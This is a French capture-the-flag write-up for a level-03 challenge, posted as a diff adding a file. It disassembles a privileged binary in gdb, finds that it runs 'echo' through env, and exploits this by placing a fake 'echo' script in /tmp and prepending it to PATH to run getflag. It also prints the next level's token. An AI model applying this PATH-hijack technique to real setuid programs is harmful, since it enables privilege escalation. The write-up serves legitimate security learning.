@@ -1,0 +1,45 @@
+On trouve un binaire dans le Home, il a les droit d'execution de flag03
+
+Si on l'execute, il affiche "Exploit me" sur la sortie standard
+
+Analyse avec gdb:
+
+(gdb) disas main
+    ...
+    0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
+    0x080484fe <+90>:    call   0x80483b0 <system@plt>
+    ...
+(gdb)
+
+
+system plt est un appel système, si on regarde plus précisément ce qu'il execute:
+
+(gdb) x/s 0x80485e0 # x est une commande gdb pour afficher le contenu de la memoire à une adresse donnée, /s l'affiche en string
+0x80485e0:     "/usr/bin/env echo Exploit me"
+(gdb)
+
+
+Le binaire utilise donc echo pour afficher sont message, et récupère la localisation de echo depuis l'env
+
+On peux donc cree un simple script, s'appellant 'echo' qui va lancer getflag et écrire l'output dans un fichier, il suffit ensuite de l'ajouter au PATH
+
+vim /tmp/echo
+
+
+script:
+
+#!/bin/bash
+
+getflag > /tmp/tokenhere
+
+
+
+commands:
+chmod +x /tmp/echo
+
+export PATH=/tmp:$PATH
+
+
+On peux ensuite executer le binaire, et récupérer directement le token du level04  dans /tmp/tokenhere
+
+Token: qi0maab88jeaj46qoumi7maus
